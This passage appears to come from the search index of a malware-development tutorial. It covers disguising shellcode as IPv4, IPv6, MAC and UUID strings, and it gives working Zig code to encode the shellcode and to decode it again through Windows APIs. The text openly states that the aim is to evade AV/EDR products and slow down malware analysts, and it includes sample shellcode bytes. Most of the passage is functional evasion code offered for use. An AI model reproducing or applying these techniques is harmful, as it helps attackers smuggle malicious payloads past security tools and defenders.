Obfuscation","text":""},{"location":"Basic-Payload-Management/Payload-Obfuscation/IP-Address-Obfuscation/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>IP address obfuscation disguises shellcode bytes as seemingly harmless IP strings. Each byte is translated into a portion of an IPv4 or IPv6 address, making the payload appear like configuration data or network traffic. When the program runs, it parses these strings back into binary form to reconstruct the original shellcode for execution. While trivial to decode once discovered, this method can bypass naive scans that look for typical shellcode byte patterns in files or memory dumps.</p>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/IP-Address-Obfuscation/#intro","title":"Intro","text":"<p>Actually, to evade AV/EDR, you can do more than just hiding your payload in different section. You need to obfuscate the code so that the reverse engineers and malware analyst can't get the clear logic, control flow, or meaningful strings without heavily static or dynamic analysis.</p> <p>In this chapter, I will show you how to obfuscate your payload as IP address. We have both IPv4 and IPv6. Also, we provide the deobfuscation functions so that you can run the actual payload later on your malware.</p>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/IP-Address-Obfuscation/#ipv4-obfuscation","title":"IPv4 Obfuscation","text":"<p>IPv4 is constructed with 4 numbers from 0 to 255 with the size range of the number is 256 (2^8). So each number can represent 1 byte of the payload. If we represent the payload in hex, for example, we let the payload to be this.</p> <pre><code>const payload = [_]u8{0xDE, 0xAD, 0xBE, 0xEF};\n</code></pre> <p>That payload is 4 bytes in total. Then the IPv4 obfuscation result will be 222.173.190.239. If you don't know how to convert decimal to hexadecimal or vice versa, you should go learn it first to better understand the content.</p> <p>In Zig, an 8 byte value can use the type <code>u8</code>, which stands for unsigned integer with 8 bits size. So the implementation is simple, just convert the decimal to hexadecimal representation. Since they're all just integers, we can use the format string to do this.</p> main.zig<pre><code>const std = @import(\"std\");\nconst Allocator = std.mem.Allocator;\n\n// Function takes in 4 raw bytes and returns them in an IPv4 string format\nfn generateIpv4(allocator: Allocator, a: u8, b: u8, c: u8, d: u8) ![]u8 {\n    // Creating the IPv4 address string\n    return try std.fmt.allocPrint(allocator, \"{d}.{d}.{d}.{d}\", .{ a, b, c, d });\n}\n\n/// Generate the IPv4 output representation of the shellcode\n/// Function requires an allocator and shellcode as the input\nfn generateIpv4Output(allocator: Allocator, shellcode: []const u8) !bool {\n    const stdout = std.io.getStdOut().writer();\n\n    // If the shellcode buffer is empty or the size is not a multiple of 4, exit\n    if (shellcode.len == 0 or shellcode.len % 4 != 0) {\n        return false;\n    }\n\n    try stdout.print(\"const ipv4_array = [_][*:0]const u8{{\\n\\t\", .{});\n\n    // We will read one shellcode byte at a time, when the total is 4, begin generating the IPv4 address\n    // The variable 'c' is used to store the number of bytes read. By default, starts at 4.\n    var c: usize = 4;\n    var counter: usize = 0;\n\n    var i: usize = 0;\n    while (i &lt; shellcode.len) : (i += 1) {\n        // Track the number of bytes read and when they reach 4 we enter this if statement to begin generating the IPv4 address\n        if (c == 4) {\n            counter += 1;\n\n            // Generating the IPv4 address from 4 bytes which begin at i until [i + 3]\n            const ip = try generateIpv4(allocator, shellcode[i], shellcode[i + 1], shellcode[i + 2], shellcode[i + 3]);\n            defer allocator.free(ip); // Free the allocated string when done\n\n            if (i == shellcode.len - 4) {\n                // Printing the last IPv4 address\n                try stdout.print(\"\\\"{s}\\\"\", .{ip});\n                break;\n            } else {\n                // Printing the IPv4 address\n                try stdout.print(\"\\\"{s}\\\", \", .{ip});\n            }\n\n            c = 1;\n\n            // Optional: To beautify the output on the console\n            if (counter % 8 == 0) {\n                try stdout.print(\"\\n\\t\", .{});\n            }\n        } else {\n            c += 1;\n        }\n    }\n\n    try stdout.print(\"\\n}};\\n\\n\", .{});\n    return true;\n}\n\npub fn main() !void {\n    // Create an arena allocator that frees all allocations at once at the end\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n\n    const allocator = arena.allocator();\n    // Example shellcode (must be a multiple of 4 bytes)\n    const shellcode = [_]u8{\n        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed\n    };\n\n    // Generate and print the IPv4 representation\n    _ = try generateIpv4Output(allocator, &amp;shellcode);\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/IP-Address-Obfuscation/#ipv4-deobfuscation","title":"IPv4 Deobfuscation","text":"<p>Source code</p> main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst NTSTATUS = win.NTSTATUS;\nconst BOOLEAN = win.BOOLEAN;\nconst PCSTR = [*:0]const u8;\nconst PVOID = ?*anyopaque;\nconst PBYTE = [*]u8;\nconst SIZE_T = usize;\n\n// Define function pointer type for RtlIpv4StringToAddressA\nconst fnRtlIpv4StringToAddressA = fn (\n    S: PCSTR,\n    Strict: BOOLEAN,\n    Terminator: *PCSTR,\n    Addr: PVOID,\n) callconv(win.WINAPI) NTSTATUS;\n\n/// Deobfuscates an array of IPv4 strings into a byte buffer\npub fn ipv4Deobfuscation(\n    ipv4Array: []const [*:0]const u8,\n    allocator: std.mem.Allocator,\n) !struct { buffer: []u8, size: SIZE_T } {\n    // Create a UTF-16 string for \"NTDLL\"\n    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral(\"NTDLL\");\n\n    // Load the NTDLL library using wide string\n    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);\n    if (ntdll_module == null) {\n        std.debug.print(\"[!] GetModuleHandle Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetModuleHandleFailed;\n    }\n\n    // Get the address of RtlIpv4StringToAddressA function\n    const rtlIpv4StringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, \"RtlIpv4StringToAddressA\");\n    if (rtlIpv4StringToAddressA_ptr == null) {\n        std.debug.print(\"[!] GetProcAddress Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetProcAddressFailed;\n    }\n\n    // Cast the function pointer to the correct type\n    const rtlIpv4StringToAddressA: *const fnRtlIpv4StringToAddressA = @ptrCast(rtlIpv4StringToAddressA_ptr);\n\n    // Calculate the size of the buffer needed (number of IPv4 addresses * 4 bytes each)\n    const bufferSize = ipv4Array.len * 4;\n\n    // Allocate memory for the deobfuscated shellcode\n    var buffer = try allocator.alloc(u8, bufferSize);\n    errdefer allocator.free(buffer);\n\n    // Deobfuscate each IPv4 address\n    for (ipv4Array, 0..) |ipAddress, i| {\n        var terminator: PCSTR = undefined;\n\n        // Calculate the offset in the buffer for this IPv4 address\n        const offset = i * 4;\n\n        // Convert the IPv4 string to bytes\n        const status = rtlIpv4StringToAddressA(ipAddress, win.FALSE, &amp;terminator, &amp;buffer[offset]);\n\n        // Check if the status is not SUCCESS (0)\n        // Use the proper status constant from the ntstatus module\n        if (status != NTSTATUS.SUCCESS) {\n            std.debug.print(\"[!] RtlIpv4StringToAddressA Failed At [{s}] With Error 0x{X:0&gt;8}\\n\", .{ ipAddress, @intFromEnum(status) });\n            return error.RtlIpv4StringToAddressFailed;\n        }\n    }\n\n    return .{ .buffer = buffer, .size = bufferSize };\n}\n\npub fn main() !void {\n    // Setup allocator\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n    const allocator = arena.allocator();\n\n    // Example array of IPv4 addresses\n    const ipv4_array = [_][*:0]const u8{ \"252.72.131.228\", \"240.232.192.0\", \"0.0.65.81\", \"65.80.82.81\" };\n    std.debug.print(\"[+] Attempting to deobfuscate {} IPv4 addresses\\n\", .{ipv4_array.len});\n\n    // Call the deobfuscation function\n    const result = try ipv4Deobfuscation(&amp;ipv4_array, allocator);\n    defer allocator.free(result.buffer);\n\n    std.debug.print(\"[+] Successfully deobfuscated shellcode\\n\", .{});\n    std.debug.print(\"[+] Buffer size: {} bytes\\n\", .{result.size});\n\n    // Optionally print the bytes (first 16 bytes or fewer if smaller)\n    const bytes_to_print = @min(result.size, 16);\n    std.debug.print(\"[+] First {} bytes: \", .{bytes_to_print});\n    for (result.buffer[0..bytes_to_print]) |byte| {\n        std.debug.print(\"{X:0&gt;2} \", .{byte});\n    }\n    std.debug.print(\"\\n\", .{});\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/IP-Address-Obfuscation/#ipv6-obfuscation","title":"IPv6 Obfuscation","text":"<p>Source code</p> main.zig<pre><code>const std = @import(\"std\");\nconst Allocator = std.mem.Allocator;\n\n/// Function takes in 16 raw bytes and returns them in an IPv6 address string format\nfn generateIpv6(allocator: Allocator, bytes: [16]u8) ![]u8 {\n    // Each segment is 2 bytes (4 hex characters + colon)\n    // Format as 8 segments of 2 bytes each with colons between them\n    return try std.fmt.allocPrint(\n        allocator,\n        \"{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}:{X:0&gt;2}{X:0&gt;2}\",\n        .{\n            bytes[0],  bytes[1],  bytes[2],  bytes[3],\n            bytes[4],  bytes[5],  bytes[6],  bytes[7],\n            bytes[8],  bytes[9],  bytes[10], bytes[11],\n            bytes[12], bytes[13], bytes[14], bytes[15],\n        },\n    );\n}\n\n/// Generate the IPv6 output representation of the shellcode\n/// Function requires a slice to the shellcode buffer\nfn generateIpv6Output(allocator: Allocator, shellcode: []const u8) !bool {\n    const stdout = std.io.getStdOut().writer();\n\n    // If the shellcode buffer is empty or the size is not a multiple of 16, exit\n    if (shellcode.len == 0 or shellcode.len % 16 != 0) {\n        return false;\n    }\n\n    try stdout.print(\"const ipv6_array = [_][*:0]const u8{{\\n    \", .{});\n\n    // We will read one shellcode byte at a time, when the total is 16, begin generating the IPv6 address\n    // The variable 'c' is used to store the number of bytes read. By default, starts at 16.\n    var c: usize = 16;\n    var counter: usize = 0;\n\n    var i: usize = 0;\n    while (i &lt; shellcode.len) : (i += 1) {\n        // Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the IPv6 address\n        if (c == 16) {\n            counter += 1;\n\n            // Create a temporary array to hold the 16 bytes\n            var temp_bytes: [16]u8 = undefined;\n            @memcpy(temp_bytes[0..], shellcode[i..][0..16]);\n\n            // Generating the IPv6 address from 16 bytes\n            const ip = try generateIpv6(allocator, temp_bytes);\n            defer allocator.free(ip);\n\n            if (i == shellcode.len - 16) {\n                // Printing the last IPv6 address\n                try stdout.print(\"\\\"{s}\\\"\", .{ip});\n                break;\n            } else {\n                // Printing the IPv6 address\n                try stdout.print(\"\\\"{s}\\\", \", .{ip});\n            }\n\n            c = 1;\n\n            // Optional: To beautify the output on the console\n            if (counter % 3 == 0) {\n                try stdout.print(\"\\n    \", .{});\n            }\n        } else {\n            c += 1;\n        }\n    }\n\n    try stdout.print(\"\\n}};\\n\\n\", .{});\n    return true;\n}\n\npub fn main() !void {\n    // Create an arena allocator for efficient memory management\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n\n    const allocator = arena.allocator();\n\n    // Example shellcode (must be a multiple of 16 bytes)\n    const shellcode = [_]u8{\n        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed\n    };\n\n    // Generate and print the IPv6 representation\n    _ = try generateIpv6Output(allocator, &amp;shellcode);\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/IP-Address-Obfuscation/#ipv6-deobfuscation","title":"IPv6 Deobfuscation","text":"<p>Source code</p> main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst NTSTATUS = win.NTSTATUS;\nconst BOOLEAN = win.BOOLEAN;\nconst PCSTR = [*:0]const u8;\nconst PVOID = ?*anyopaque;\nconst PBYTE = [*]u8;\nconst SIZE_T = usize;\n\n// Define function pointer type for RtlIpv6StringToAddressA\nconst fnRtlIpv6StringToAddressA = fn (\n    S: PCSTR,\n    Terminator: *PCSTR,\n    Addr: PVOID,\n) callconv(win.WINAPI) NTSTATUS;\n\n/// Deobfuscates an array of IPv6 strings into a byte buffer\npub fn ipv6Deobfuscation(\n    ipv6Array: []const [*:0]const u8,\n    allocator: std.mem.Allocator,\n) !struct { buffer: []u8, size: SIZE_T } {\n    // Create a UTF-16 string for \"NTDLL\"\n    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral(\"NTDLL\");\n\n    // Load the NTDLL library using wide string\n    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);\n    if (ntdll_module == null) {\n        std.debug.print(\"[!] GetModuleHandle Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetModuleHandleFailed;\n    }\n\n    // Get the address of RtlIpv6StringToAddressA function\n    const rtlIpv6StringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, \"RtlIpv6StringToAddressA\");\n    if (rtlIpv6StringToAddressA_ptr == null) {\n        std.debug.print(\"[!] GetProcAddress Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetProcAddressFailed;\n    }\n\n    // Cast the function pointer to the correct type\n    const rtlIpv6StringToAddressA: *const fnRtlIpv6StringToAddressA = @ptrCast(rtlIpv6StringToAddressA_ptr);\n\n    // Calculate the size of the buffer needed (number of IPv6 addresses * 16 bytes each)\n    const bufferSize = ipv6Array.len * 16; // IPv6 addresses are 16 bytes each\n\n    // Allocate memory for the deobfuscated shellcode\n    const buffer = try allocator.alloc(u8, bufferSize);\n    errdefer allocator.free(buffer);\n\n    // Using a raw pointer to keep track of our current position\n    var tmpBuffer: [*]u8 = buffer.ptr;\n\n    // Deobfuscate each IPv6 address\n    for (ipv6Array) |ipv6Address| {\n        var terminator: PCSTR = undefined;\n\n        // Convert the IPv6 string to bytes\n        const status = rtlIpv6StringToAddressA(ipv6Address, &amp;terminator, tmpBuffer);\n\n        // Check if the status is not SUCCESS (0)\n        if (status != NTSTATUS.SUCCESS) {\n            std.debug.print(\"[!] RtlIpv6StringToAddressA Failed At [{s}] With Error 0x{X:0&gt;8}\\n\", .{ ipv6Address, @intFromEnum(status) });\n            return error.RtlIpv6StringToAddressFailed;\n        }\n\n        // Increment tmpBuffer by 16 bytes for the next address\n        // Fixed version using pointer arithmetic\n        tmpBuffer = @as([*]u8, @ptrFromInt(@intFromPtr(tmpBuffer) + 16));\n    }\n\n    return .{ .buffer = buffer, .size = bufferSize };\n}\n\npub fn main() !void {\n    // Setup allocator\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n    const allocator = arena.allocator();\n\n    // Example array of IPv6 addresses (shellcode encoded as IPv6)\n    const ipv6_array = [_][*:0]const u8{\n        \"fc48:83e4:f0e8:c000:0000:4151:4150:5251\",\n    };\n\n    std.debug.print(\"[+] Attempting to deobfuscate {} IPv6 addresses\\n\", .{ipv6_array.len});\n\n    // Call the deobfuscation function\n    const result = try ipv6Deobfuscation(&amp;ipv6_array, allocator);\n    defer allocator.free(result.buffer);\n\n    std.debug.print(\"[+] Successfully deobfuscated shellcode\\n\", .{});\n    std.debug.print(\"[+] Buffer size: {} bytes\\n\", .{result.size});\n\n    // Print all bytes\n    std.debug.print(\"[+] Deobfuscated bytes: \", .{});\n    for (result.buffer) |byte| {\n        std.debug.print(\"{X:0&gt;2} \", .{byte});\n    }\n    std.debug.print(\"\\n\", .{});\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/MAC-Address-Obfuscation/","title":"MAC Address Obfuscation","text":""},{"location":"Basic-Payload-Management/Payload-Obfuscation/MAC-Address-Obfuscation/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>MAC address obfuscation converts shellcode into strings formatted like hardware MAC addresses (e.g., <code>AA-BB-CC-DD-EE-FF</code>). Because such strings are common in network configuration data, they may not raise suspicion when stored or transmitted. The program later splits these strings, converts the hexadecimal pairs back into bytes, and concatenates them into the original payload. While simple, this technique effectively hides binary code from direct inspection.</p>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/MAC-Address-Obfuscation/#obfuscation","title":"Obfuscation","text":"main.zig<pre><code>const std = @import(\"std\");\n\n/// Generates a MAC address string from 6 raw bytes\nfn generateMAC(a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, buffer: []u8) []const u8 {\n    // Format the 6 bytes as a MAC address string (XX-XX-XX-XX-XX-XX)\n    return std.fmt.bufPrint(buffer, \"{X:0&gt;2}-{X:0&gt;2}-{X:0&gt;2}-{X:0&gt;2}-{X:0&gt;2}-{X:0&gt;2}\", .{\n        a, b, c, d, e, f,\n    }) catch unreachable;\n}\n\n/// Generate the MAC output representation of the shellcode\nfn generateMacOutput(pShellcode: []const u8, writer: anytype) !bool {\n    const shellcodeSize = pShellcode.len;\n\n    // If the shellcode buffer is empty or the size is not a multiple of 6, exit\n    if (shellcodeSize == 0 or shellcodeSize % 6 != 0) {\n        return false;\n    }\n\n    try writer.print(\"const mac_array = [_][*:0]const u8{{\\n\\t\", .{});\n\n    // Buffer to hold the MAC address string (XX-XX-XX-XX-XX-XX = 17 chars + null)\n    var macBuffer: [32]u8 = undefined;\n\n    var counter: usize = 0;\n\n    // Process the shellcode in groups of 6 bytes\n    var i: usize = 0;\n    while (i &lt; shellcodeSize) {\n        // Generate a MAC address from the current 6 bytes\n        const mac = generateMAC(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5], &amp;macBuffer);\n\n        counter += 1;\n\n        // Print the MAC address\n        if (i == shellcodeSize - 6) {\n            // Last MAC address\n            try writer.print(\"\\\"{s}\\\"\", .{mac});\n        } else {\n            // Not the last one, add comma\n            try writer.print(\"\\\"{s}\\\", \", .{mac});\n        }\n\n        // Move to the next group of 6 bytes\n        i += 6;\n\n        // Add a newline for formatting after every 6 MAC addresses\n        if (counter % 6 == 0 and i &lt; shellcodeSize) {\n            try writer.print(\"\\n\\t\", .{});\n        }\n    }\n\n    try writer.print(\"\\n}};\\n\\n\", .{});\n    return true;\n}\n\npub fn main() !void {\n    // Example shellcode (must be a multiple of 6 bytes)\n    const shellcode = [_]u8{\n        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, // 1st MAC\n        0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, // 2nd MAC\n        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, // 3rd MAC\n        0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, // 4th MAC\n        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, // 5th MAC\n        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, // 6th MAC\n        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, // 7th MAC\n    };\n\n    // Use stdout as the writer\n    const stdout = std.io.getStdOut().writer();\n\n    std.debug.print(\"[+] Generating MAC address representation for {} bytes of shellcode\\n\", .{shellcode.len});\n\n    // Generate and print the MAC address representation\n    if (try generateMacOutput(&amp;shellcode, stdout)) {} else {\n        std.debug.print(\"[!] Failed to generate MAC address representation\\n\", .{});\n    }\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/MAC-Address-Obfuscation/#deobfuscation","title":"Deobfuscation","text":"main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst NTSTATUS = win.NTSTATUS;\nconst PCSTR = [*:0]const u8;\nconst PVOID = ?*anyopaque;\nconst PBYTE = [*]u8;\nconst SIZE_T = usize;\n\n// Define function pointer type for RtlEthernetStringToAddressA\nconst fnRtlEthernetStringToAddressA = fn (\n    S: PCSTR,\n    Terminator: *PCSTR,\n    Addr: PVOID,\n) callconv(win.WINAPI) NTSTATUS;\n\n/// Deobfuscates an array of MAC addresses into a byte buffer\npub fn macDeobfuscation(\n    macArray: []const [*:0]const u8,\n    allocator: std.mem.Allocator,\n) !struct { buffer: []u8, size: SIZE_T } {\n    // Create a UTF-16 string for \"NTDLL\"\n    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral(\"NTDLL\");\n\n    // Load the NTDLL library using wide string\n    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);\n    if (ntdll_module == null) {\n        std.debug.print(\"[!] GetModuleHandle Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetModuleHandleFailed;\n    }\n\n    // Get the address of RtlEthernetStringToAddressA function\n    const rtlEthernetStringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, \"RtlEthernetStringToAddressA\");\n    if (rtlEthernetStringToAddressA_ptr == null) {\n        std.debug.print(\"[!] GetProcAddress Failed With Error : {}\\n\", .{kernel32.GetLastError()});\n        return error.GetProcAddressFailed;\n    }\n\n    // Cast the function pointer to the correct type\n    const rtlEthernetStringToAddressA: *const fnRtlEthernetStringToAddressA = @ptrCast(rtlEthernetStringToAddressA_ptr);\n\n    // Calculate the size of the buffer needed (number of MAC addresses * 6 bytes each)\n    const bufferSize = macArray.len * 6; // MAC addresses are 6 bytes each\n\n    // Allocate memory for the deobfuscated shellcode\n    const buffer = try allocator.alloc(u8, bufferSize);\n    errdefer allocator.free(buffer);\n\n    // Using a raw pointer to keep track of our current position\n    var tmpBuffer: [*]u8 = buffer.ptr;\n\n    // Deobfuscate each MAC address\n    for (macArray) |macAddress| {\n        var terminator: PCSTR = undefined;\n\n        // Convert the MAC address string to bytes\n        const status = rtlEthernetStringToAddressA(macAddress, &amp;terminator, tmpBuffer);\n\n        // Check if the status is not SUCCESS (0)\n        if (status != NTSTATUS.SUCCESS) {\n            std.debug.print(\"[!] RtlEthernetStringToAddressA Failed At [{s}] With Error 0x{X:0&gt;8}\\n\", .{ macAddress, @intFromEnum(status) });\n            return error.RtlEthernetStringToAddressFailed;\n        }\n\n        // Increment tmpBuffer by 6 bytes for the next address\n        tmpBuffer = @as([*]u8, @ptrFromInt(@intFromPtr(tmpBuffer) + 6));\n    }\n\n    return .{ .buffer = buffer, .size = bufferSize };\n}\n\npub fn main() !void {\n    // Setup allocator\n    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);\n    defer arena.deinit();\n    const allocator = arena.allocator();\n\n    // Example array of MAC addresses (shellcode encoded as MAC)\n    const mac_array = [_][*:0]const u8{ \"FC-48-83-E4-F0-E8\", \"C0-00-00-00-41-51\", \"41-50-52-51-56-48\", \"31-D2-65-48-8B-52\", \"60-48-8B-52-18-48\", \"8B-52-20-48-8B-72\", \"50-48-0F-B7-4A-4A\" };\n    std.debug.print(\"[+] Attempting to deobfuscate {} MAC addresses\\n\", .{mac_array.len});\n\n    // Call the deobfuscation function\n    const result = try macDeobfuscation(&amp;mac_array, allocator);\n    defer allocator.free(result.buffer);\n\n    std.debug.print(\"[+] Successfully deobfuscated shellcode\\n\", .{});\n    std.debug.print(\"[+] Buffer size: {} bytes\\n\", .{result.size});\n\n    // Print all bytes\n    std.debug.print(\"[+] Deobfuscated bytes: \", .{});\n    for (result.buffer) |byte| {\n        std.debug.print(\"{X:0&gt;2} \", .{byte});\n    }\n    std.debug.print(\"\\n\", .{});\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/UUID-Obfuscation/","title":"UUID Obfuscation","text":""},{"location":"Basic-Payload-Management/Payload-Obfuscation/UUID-Obfuscation/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>UUID obfuscation stores shellcode chunks as Universally Unique Identifier strings. Since UUIDs are routinely seen in configuration files and logs, a list of them does not appear suspicious. The program converts groups of 16 bytes into UUID format and later decodes them back to raw bytes in memory. This method adds an extra step for analysts trying to recover the original payload and can evade simple pattern-based searches.</p>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/UUID-Obfuscation/#obfuscation","title":"Obfuscation","text":"main.zig<pre><code>const std = @import(\"std\");\n\n/// Generates a UUID string from 16 raw bytes\nfn generateUuid(a: u8, b: u8, c: u8, d: u8, e: u8, f: u8, g: u8, h: u8, i: u8, j: u8, k: u8, l: u8, m: u8, n: u8, o: u8, p: u8, buffer: []u8) ![]const u8 {\n    // In Zig, we can directly format the entire UUID in one go instead of\n    // creating intermediate segments as in the C version\n    return try std.fmt.bufPrint(buffer, \"{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}-{X:0&gt;2}{X:0&gt;2}-{X:0&gt;2}{X:0&gt;2}-{X:0&gt;2}{X:0&gt;2}-{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}{X:0&gt;2}\", .{ d, c, b, a, f, e, h, g, i, j, k, l, m, n, o, p });\n}\n\n/// Generate the UUID output representation of the shellcode\nfn generateUuidOutput(pShellcode: []const u8, writer: anytype) !bool {\n    const shellcodeSize = pShellcode.len;\n\n    // If the shellcode buffer is empty or the size is not a multiple of 16, exit\n    if (shellcodeSize == 0 or shellcodeSize % 16 != 0) {\n        return false;\n    }\n\n    try writer.print(\"const uuid_array = [_][*:0]const u8{{\\n\\t\", .{});\n\n    // Buffer to hold the UUID string (36 chars + null terminator)\n    var uuidBuffer: [40]u8 = undefined;\n\n    // Process the shellcode in groups of 16 bytes\n    var counter: usize = 0;\n    var i: usize = 0;\n\n    while (i &lt; shellcodeSize) {\n        // Make sure we have 16 bytes available\n        if (i + 15 &gt;= shellcodeSize) break;\n\n        counter += 1;\n\n        // Generate the UUID from the current 16 bytes\n        const uuid = try generateUuid(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7], pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11], pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15], &amp;uuidBuffer);\n\n        // Print the UUID\n        if (i == shellcodeSize - 16) {\n            // Last UUID\n            try writer.print(\"\\\"{s}\\\"\", .{uuid});\n        } else {\n            // Not the last one, add comma\n            try writer.print(\"\\\"{s}\\\", \", .{uuid});\n        }\n\n        // Move to next group of 16 bytes\n        i += 16;\n\n        // Add a newline for formatting after every 3 UUIDs\n        if (counter % 3 == 0 and i &lt; shellcodeSize) {\n            try writer.print(\"\\n\\t\", .{});\n        }\n    }\n\n    try writer.print(\"\\n}};\\n\\n\", .{});\n    return true;\n}\n\npub fn main() !void {\n    // Example shellcode (must be a multiple of 16 bytes)\n    const shellcode = [_]u8{\n        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, // Add more shellcode here if needed\n    };\n\n    // Use stdout as the writer\n    const stdout = std.io.getStdOut().writer();\n\n    std.debug.print(\"[+] Generating UUID representation for {} bytes of shellcode\\n\", .{shellcode.len});\n\n    // Generate and print the UUID representation\n    if (try generateUuidOutput(&amp;shellcode, stdout)) {} else {\n        std.debug.print(\"[!] Failed to generate UUID representation\\n\", .{});\n    }\n}\n</code></pre>"},{"location":"Basic-Payload-Management/Payload-Obfuscation/UUID-Obfuscation/#deobfuscation","title":"Deobfuscation","text":"main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst WINAPI = windows.WINAPI;\n\n// Type definitions\nconst RPC_STATUS = u32;\nconst RPC_CSTR = [*:0]const u8;\nconst UUID = extern struct {\n    data1: u32,\n    data2: u16,\n    data3: u16,\n    data4: [8]u8,\n};\n\nconst RPC_S_OK: RPC_STATUS = 0;\n\n// Function pointer type for UuidFromStringA\nconst UuidFromStringAFn = *const fn (RPC_CSTR, *UUID) callconv(WINAPI) RPC_STATUS;\n\n// External function declarations\nextern \"kernel32\" fn GetProcAddress(hModule: windows.HMODULE, lpProcName: [*:0]const u8) callconv(WINAPI) ?windows.FARPROC;\nextern \"kernel32\" fn LoadLibraryA(lpLibFileName: [*:0]const u8) callconv(WINAPI) ?windows.HMODULE;\nextern \"kernel32\" fn GetProcessHeap() callconv(WINAPI) windows.HANDLE;\nextern \"kernel32\" fn HeapAlloc(hHeap: windows.HANDLE, dwFlags: windows.DWORD, dwBytes: usize) callconv(WINAPI) ?*anyopaque;\nextern \"kernel32\" fn HeapFree(hHeap: windows.HANDLE, dwFlags: windows.DWORD, lpMem: ?*anyopaque) callconv(WINAPI) windows.BOOL;\nextern \"kernel32\" fn GetLastError() callconv(WINAPI) windows.DWORD;\n\nconst HEAP_ZERO_MEMORY: windows.DWORD = 0x00000008;\n\npub fn uuidDeobfuscation(\n    uuid_array: []const [*:0]const u8,\n    pp_d_address: *?[*]u8,\n    p_d_size: *usize,\n) bool {\n    // Getting UuidFromStringA address from Rpcrt4.dll\n    const rpcrt4_handle = LoadLibraryA(\"RPCRT4\") orelse {\n        std.debug.print(\"[!] LoadLibrary Failed With Error : {}\\n\", .{GetLastError()});\n        return false;\n    };\n\n    const proc_addr = GetProcAddress(rpcrt4_handle, \"UuidFromStringA\") orelse {\n        std.debug.print(\"[!] GetProcAddress Failed With Error : {}\\n\", .{GetLastError()});\n        return false;\n    };\n\n    const uuid_from_string_a: UuidFromStringAFn = @ptrCast(proc_addr);\n\n    // Getting the real size of the shellcode which is the number of UUID strings * 16\n    const buff_size = uuid_array.len * 16;\n\n    // Allocating memory which will hold the deobfuscated shellcode\n    const buffer_ptr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buff_size) orelse {\n        std.debug.print(\"[!] HeapAlloc Failed With Error : {}\\n\", .{GetLastError()});\n        return false;\n    };\n\n    const buffer: [*]u8 = 